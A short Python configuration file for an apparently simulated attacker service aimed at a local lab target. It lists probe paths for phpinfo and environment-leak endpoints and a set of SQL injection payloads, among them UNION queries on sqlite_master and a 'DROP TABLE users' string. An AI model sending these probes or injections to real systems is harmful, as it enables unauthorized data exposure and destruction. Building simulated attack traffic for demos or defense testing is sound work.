import os

TARGET_URL = os.getenv("TARGET_URL") or "http://web:16000"
INTERVAL_SECONDS = int(os.getenv("ATTACKER_INTERVAL_SECONDS", "1"))
NOTE_INTERVAL_SECONDS = int(os.getenv("ATTACKER_NOTE_INTERVAL_SECONDS", "6"))
ATTACKER_USERNAME = "attacker"
ATTACKER_PASSWORD = "AttackerHamburtacker67!"


# I got these from my cloudflare security logs
suspicious_paths = [
    "/smtp/phpinfo.php",
    "/webmail/phpinfo.php",
    "/mail/phpinfo.php",
    "/hosting/phpinfo.php",
    "/cpanel/phpinfo.php",
    "/_environment",
    "/_profiler/phpinfo",
    "/webroot/index.php/_environment",
    "/server-status.php",
    "/server-info.php",
]

SQL_NOTE_PAYLOADS = (
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' AND '1'='1' --",
    "' AND '1'='2' --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT sqlite_version(),NULL --",
    "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --",
    "' OR EXISTS(SELECT 1 FROM sqlite_master) --",
    "'/**/OR/**/1=1 --",
    "'; DROP TABLE users;--",
)


def validate_settings():
    if not 1 <= INTERVAL_SECONDS <= 86400:
        raise ValueError("ATTACKER_INTERVAL_SECONDS must be between 1 and 86400")
    if not 6 <= NOTE_INTERVAL_SECONDS <= 604800:
        raise ValueError("ATTACKER_NOTE_INTERVAL_SECONDS must be between 6 and 604800")
